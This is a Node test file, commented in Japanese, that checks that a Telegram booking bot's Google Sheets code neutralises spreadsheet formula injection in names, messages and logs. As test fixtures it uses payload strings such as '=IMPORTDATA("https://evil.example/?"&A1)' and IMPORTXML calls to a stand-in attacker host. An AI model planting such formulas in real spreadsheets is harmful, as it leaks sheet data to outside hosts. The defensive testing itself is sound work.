/**
 * v7: Telegram やミニアプリから届いた文字列が、シートで数式として動かないことの確認（2026-10-27）
 *
 * 実行: node --test tests/
 *
 * v7 の実ファイル（.gs）を Node の vm に読み込み、SpreadsheetApp などは下のスタブで置き換える。
 * スタブのシートは「setValue に渡された値（raw）」をそのまま持ち、読み出しは Google スプレッドシートと同じく
 *   - 先頭の ' は外して文字列で返す
 *   - = で始まる raw は数式として扱う（中身は評価しない）
 * ※ このファイルは v7/ の外に置く（v7/ の .js は clasp push で本番に送られるため）
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const V7 = path.join(__dirname, '..', 'v7');
const FILES = ['Config.gs', 'SheetHelpers.gs', 'ForumTopicManager.gs', 'ShopRouting.gs',
  'CustomerChat.gs', 'Router.gs', 'FunnelLog.gs', 'PartnerSelfRegister.gs'];
// 営業ボード（v7-operations・別の GAS プロジェクト）は v7 のシートを読み戻して書く
const OPS = path.join(__dirname, '..', 'v7-operations');
const OPS_FILES = ['SheetHelpers.gs', 'ScoutBoard.gs'];   // safeCellValue_ は SheetHelpers.gs（2026-10-27 共通化）

const EVIL = '=IMPORTDATA("https://evil.example/?"&A1)';

// ====== スプレッドシートのスタブ ======

function cellValue(raw) {
  if (raw === undefined || raw === null) return '';
  if (typeof raw === 'string' && raw.charAt(0) === "'") return raw.slice(1);
  if (typeof raw === 'string' && raw.charAt(0) === '=') return '#FORMULA';
  return raw;
}

/** vm の中で作った Date は外の Date と別物なので instanceof を使わない */
function isDate(v) { return Object.prototype.toString.call(v) === '[object Date]'; }

/** スプレッドシートが数式として動かすか（数字だけの文字列は数値になるだけなので除く） */
function wouldRunAsFormula(raw) {
  return typeof raw === 'string' && /^[=+\-@]/.test(raw) && !/^[+\-]?(\d+(\.\d*)?|\.\d+)$/.test(raw);
}

/** 書式だけ変えるメソッドは何もせず自分を返す */
const NOOP_RANGE = ['setFontWeight', 'setBackground', 'setWrap', 'setVerticalAlignment', 'setFontColor',
  'setNumberFormat', 'setHorizontalAlignment'];
const NOOP_SHEET = ['setColumnWidth', 'setFrozenRows'];

class FakeRange {
  constructor(sheet, row, col, nr, nc) { Object.assign(this, { sheet, row, col, nr: nr || 1, nc: nc || 1 }); }
  getValues() {
    const out = [];
    for (let r = 0; r < this.nr; r++) {
      const line = [];
      for (let c = 0; c < this.nc; c++) line.push(cellValue((this.sheet.raw[this.row - 1 + r] || [])[this.col - 1 + c]));
      out.push(line);
    }
    return out;
  }
  getValue() { return this.getValues()[0][0]; }
  setValues(vals) {
    vals.forEach((line, r) => line.forEach((v, c) => this.sheet.put(this.row + r, this.col + c, v)));
    return this;
  }
  setValue(v) { this.sheet.put(this.row, this.col, v); return this; }
}
NOOP_RANGE.forEach((m) => { FakeRange.prototype[m] = function() { return this; }; });

class FakeSheet {
  constructor(name, rows) { this.name = name; this.raw = rows.map((r) => r.slice()); }
  getName() { return this.name; }
  getLastRow() { return this.raw.length; }
  getLastColumn() { return Math.max(0, ...this.raw.map((r) => r.length)); }
  getRange(row, col, nr, nc) { return new FakeRange(this, row, col, nr, nc); }
  getDataRange() { return this.getRange(1, 1, this.getLastRow(), this.getLastColumn()); }
  appendRow(arr) { this.raw.push(arr.slice()); return this; }
  put(row, col, v) {
    while (this.raw.length < row) this.raw.push([]);
    this.raw[row - 1][col - 1] = v;
  }
  getFilter() { return null; }
  clear() { this.raw = []; return this; }
  /** 見出しの列名で raw を引く */
  rawAt(row, header) { return this.raw[row - 1][this.raw[0].indexOf(header)]; }
}
NOOP_SHEET.forEach((m) => { FakeSheet.prototype[m] = function() { return this; }; });

function memoryStore() {
  const m = {};
  return {
    getProperty: (k) => (k in m ? m[k] : null),
    setProperty: (k, v) => { m[k] = String(v); },
    setProperties: (o) => { Object.keys(o).forEach((k) => { m[k] = String(o[k]); }); },
    deleteProperty: (k) => { delete m[k]; },
    getProperties: () => Object.assign({}, m),
    get: (k) => (k in m ? m[k] : null),
    getAll: (ks) => { const o = {}; ks.forEach((k) => { if (k in m) o[k] = m[k]; }); return o; },
    put: (k, v) => { m[k] = String(v); },
    remove: (k) => { delete m[k]; }
  };
}

// ====== v7 を読み込む ======

function loadV7(sheets) {
  const ss = {
    getSheetByName: (n) => sheets[n] || null,
    insertSheet: (n) => (sheets[n] = new FakeSheet(n, [])),
    getSpreadsheetTimeZone: () => 'Asia/Phnom_Penh'
  };
  const props = memoryStore();
  ['BOT_TOKEN_BOOKING', 'BOT_TOKEN_FIELD', 'ADMIN_GROUP_ID', 'SPREADSHEET_ID', 'BOOKING_CALENDAR_ID',
    'DRIVE_FOLDER_WASH_PHOTOS', 'DRIVE_FOLDER_QR_CODES', 'DRIVE_FOLDER_PAYMENT_SCREENSHOTS']
    .forEach((k) => props.setProperty(k, 'test-' + k));
  const cache = memoryStore();
  const sent = [];
  const ctx = {
    console,
    SpreadsheetApp: { openById: () => ss, getActiveSpreadsheet: () => ss, flush: () => {} },
    PropertiesService: { getScriptProperties: () => props },
    CacheService: { getScriptCache: () => cache },
    LockService: { getScriptLock: () => ({ tryLock: () => true, waitLock: () => {}, releaseLock: () => {} }) },
    Logger: { log: () => {} },
    Utilities: {
      formatDate: (d) => new Date(d).toISOString().replace('T', ' ').slice(0, 19),
      getUuid: () => '00000000-0000-0000-0000-000000000000'
    }
  };
  vm.createContext(ctx);
  FILES.forEach((f) => vm.runInContext(fs.readFileSync(path.join(V7, f), 'utf8'), ctx, { filename: f }));
  // Telegram への送信は記録するだけ（TelegramAPI.gs は読み込まない）
  ctx.createForumTopic = () => ({ ok: true, result: { message_thread_id: 42 } });
  ctx.sendMessage = (bot, chatId, text) => { sent.push({ chatId, text }); return { ok: true }; };
  ctx.shopGroupLangs_ = () => null;   // PartnerLang.gs（車屋のグループの言語）は読み込まない
  return { ctx, sent, props, run: (code) => vm.runInContext(code, ctx) };
}

function freshSheets() {
  return {
    '顧客': new FakeSheet('顧客', [['顧客ID', 'チャットID', 'ユーザー名', '氏名', '電話番号', '言語', 'トピックID',
      '登録日時', '最終連絡日時', '配信対象']]),
    '予約': new FakeSheet('予約', [['予約ID', 'チャットID', '管理者メモ'], ['BK-20261027-001', '7500384947', '']]),
    'チャット履歴': new FakeSheet('チャット履歴', [['日時', '方向', 'チャットID', 'トピックID', 'メッセージ種別', '内容', '管理者ID']]),
    'ファネルログ': new FakeSheet('ファネルログ', [['タイムスタンプ', 'チャットID', 'イベント', 'ソース', '予約ID', 'メタデータ(JSON)']]),
    'Bot連携': new FakeSheet('Bot連携', [['shop_id', '店名', 'ワンタイムコード', '状態', 'グループchat_id', 'グループ名', '紐付け日時'],
      ['SHOP-001', 'Test Garage', '123456', '待機中', '', '', '']])
  };
}

// ====== テスト ======

test('sheetSafeText_ / sheetSafeValue_: 先頭が = + - @ の文字列だけ \' を付ける', () => {
  const { ctx } = loadV7(freshSheets());
  assert.equal(ctx.sheetSafeText_(EVIL), "'" + EVIL);
  assert.equal(ctx.sheetSafeText_('+IMPORTXML("x")'), "'+IMPORTXML(\"x\")");
  assert.equal(ctx.sheetSafeText_('-2+3'), "'-2+3");
  assert.equal(ctx.sheetSafeText_('@sophea_k'), "'@sophea_k");
  assert.equal(ctx.sheetSafeText_('Sophea'), 'Sophea');
  assert.equal(ctx.sheetSafeText_("'" + EVIL), "'" + EVIL, '2回通しても \' は増えない');
  assert.equal(ctx.sheetSafeText_(null), '');
  // sheetSafeValue_: 数値・日付・真偽・数字だけの文字列は今までどおり
  const d = new Date();
  assert.equal(ctx.sheetSafeValue_(d), d);
  assert.equal(ctx.sheetSafeValue_(15), 15);
  assert.equal(ctx.sheetSafeValue_(true), true);
  assert.equal(ctx.sheetSafeValue_('-1001234567890'), '-1001234567890');
  assert.equal(ctx.sheetSafeValue_('12.5'), '12.5');
  assert.equal(ctx.sheetSafeValue_('-.5'), '-.5');
  assert.equal(ctx.sheetSafeValue_('+5.'), '+5.');
  assert.equal(ctx.sheetSafeValue_('-5+3'), "'-5+3", '計算式は数字だけの文字列ではない');
  assert.equal(ctx.sheetSafeValue_('-1e3'), "'-1e3");
  assert.equal(ctx.sheetSafeValue_(EVIL), "'" + EVIL);
  assert.equal(ctx.sheetSafeValue_(''), '');
});

test('顧客タブ: Telegram の氏名が =IMPORTDATA("x") でも \' 付きの文字列で入る（getOrCreateTopic → buildDisplayName）', () => {
  const sheets = freshSheets();
  const { ctx } = loadV7(sheets);
  const res = ctx.getOrCreateTopic({ chatId: '7500384947', firstName: '=IMPORTDATA("x")', lastName: '', username: 'evil' });
  assert.equal(res.threadId, 42);
  const cust = sheets['顧客'];
  assert.equal(cust.rawAt(2, '氏名'), '\'=IMPORTDATA("x")');
  assert.equal(cellValue(cust.rawAt(2, '氏名')), '=IMPORTDATA("x")', '画面には元の名前がそのまま出る');
  assert.equal(cust.rawAt(2, 'ユーザー名'), 'evil');
  assert.equal(cust.rawAt(2, 'チャットID'), '7500384947');
  assert.equal(cust.rawAt(2, 'トピックID'), 42, '数値はそのまま');
  assert.ok(isDate(cust.rawAt(2, '登録日時')), '日付はそのまま');
  assert.equal(cust.rawAt(2, '配信対象'), true, '真偽はそのまま');

  // 名前が無く @ユーザー名 になる人も
  ctx.getOrCreateTopic({ chatId: '7500384948', firstName: '', lastName: '', username: 'sophea_k' });
  assert.equal(cust.rawAt(3, '氏名'), "'@sophea_k");
  cust.raw.slice(1).forEach((r) => r.forEach((v) => assert.ok(!wouldRunAsFormula(v), '数式になるセルが無い: ' + v)));
});

test('顧客タブ: ミニアプリからの登録（booking_register_customer）も同じ', () => {
  const sheets = freshSheets();
  const { ctx } = loadV7(sheets);
  ctx.apiBookingRegisterCustomer({ chatId: '555', name: '+IMPORTXML("https://evil.example","//a")', username: '-x' });
  const cust = sheets['顧客'];
  assert.equal(cust.rawAt(2, '氏名'), '\'+IMPORTXML("https://evil.example","//a")');
  assert.equal(cust.rawAt(2, 'ユーザー名'), "'-x");
});

test('Bot連携タブ: グループ名が =IMPORTXML(...) でも \' 付き、グループ chat_id は数値のまま', () => {
  const sheets = freshSheets();
  const { ctx, sent } = loadV7(sheets);
  const title = '=IMPORTXML("https://evil.example/?"&A1,"//a")';
  const handled = ctx.handleShopGroupMessage_({ text: '/register 123456', chat: { id: -1001234567890, title: title } });
  assert.equal(handled, true);
  const link = sheets['Bot連携'];
  assert.equal(link.rawAt(2, 'グループ名'), "'" + title);
  assert.equal(link.rawAt(2, 'グループchat_id'), '-1001234567890');
  assert.equal(link.rawAt(2, '状態'), '連携済');
  assert.ok(sent.some((m) => m.chatId === -1001234567890), 'グループに連携完了を返している');
});

test('チャット履歴タブ: お客様のメッセージ本文が数式でも \' 付き', () => {
  const sheets = freshSheets();
  const { ctx } = loadV7(sheets);
  ctx.logChat({ direction: '顧客→管理', chatId: '7500384947', threadId: 42, messageType: 'テキスト', content: EVIL });
  const log = sheets['チャット履歴'];
  assert.equal(log.rawAt(2, '内容'), "'" + EVIL);
  assert.equal(log.rawAt(2, 'チャットID'), '7500384947');
});

test('読み戻した氏名を別のセルに書き直しても数式にならない（readRow → updateRow）', () => {
  const sheets = freshSheets();
  const { ctx, run } = loadV7(sheets);
  ctx.getOrCreateTopic({ chatId: '7500384947', firstName: EVIL, lastName: '', username: '' });
  const back = ctx.findCustomerRow('7500384947').data['氏名'];
  assert.equal(back, EVIL, '読み戻すと \' は外れている');
  ctx.updateRow(run('SHEET_NAMES.BOOKINGS'), 2, { '管理者メモ': back });
  assert.equal(sheets['予約'].rawAt(2, '管理者メモ'), "'" + EVIL);
});

test('ファネルログ: まとめて書き出す時（flushFunnelQueue_）も \' 付き', () => {
  const sheets = freshSheets();
  const { ctx, props } = loadV7(sheets);
  props.setProperty('funnelq_1761552000000_abcd1234', JSON.stringify({
    t: 1761552000000, c: EVIL, e: 'miniapp_opened', s: 'booking.html', b: '', m: ''
  }));
  const written = ctx.flushFunnelQueue_(props, props.getProperties());
  assert.equal(written, 1);
  const fl = sheets['ファネルログ'];
  assert.equal(fl.rawAt(2, 'チャットID'), "'" + EVIL);
  assert.equal(fl.rawAt(2, 'イベント'), 'miniapp_opened');
  assert.ok(isDate(fl.rawAt(2, 'タイムスタンプ')));
});

test('紹介チラシ送付履歴: 店マスターから読み戻した名前も \' 付き、グループ chat_id は数値のまま（logPartnerFlyerSend_）', () => {
  const sheets = freshSheets();
  const { ctx } = loadV7(sheets);
  ctx.logPartnerFlyerSend_({ '送った日時': '2026-10-27 12:00:00', 'パートナーID': '011', '名前': EVIL, 'shop_id': 'PTN-011',
    'チラシの版': 'v1.0', '枚数': 2, '送り方': '予約Bot（自動）', '送り先（グループchat_id）': '-1001234567890', 'URL': 'https://example.com/a.png' });
  const log = sheets['紹介チラシ送付履歴'];
  assert.ok(log, '送付履歴タブが作られる');
  assert.equal(log.rawAt(2, '名前'), "'" + EVIL);
  assert.equal(log.rawAt(2, '送り先（グループchat_id）'), '-1001234567890');
  assert.equal(log.rawAt(2, '枚数'), 2);
});

test('営業ボード（v7-operations）: Bot連携から読み戻したグループ名を書き出しても数式にならない（scoutBoardTable_）', () => {
  const ctx = { console, Logger: { log: () => {} } };
  vm.createContext(ctx);
  OPS_FILES.forEach((f) => vm.runInContext(fs.readFileSync(path.join(OPS, f), 'utf8'), ctx, { filename: f }));
  const sh = new FakeSheet('🔗 連携', []);
  // v7 が ' 付きで保存したグループ名は、読み戻すと ' が外れて届く
  const groupName = cellValue("'" + EVIL);
  const n = ctx.scoutBoardTable_(sh, 1, ['店名 (Shop)', '売上', 'グループ名', 'グループchat_id'],
    [['Test Garage', 120.5, groupName, '-1001234567890']], [], []);
  assert.equal(n, 2);
  assert.equal(sh.raw[1][2], "'" + EVIL);
  assert.equal(sh.raw[1][1], 120.5, '数値はそのまま');
  assert.equal(sh.raw[1][3], '-1001234567890', '数字だけの文字列はそのまま');
  sh.raw.forEach((r) => r.forEach((v) => assert.ok(!wouldRunAsFormula(v), '数式になるセルが無い: ' + v)));
});
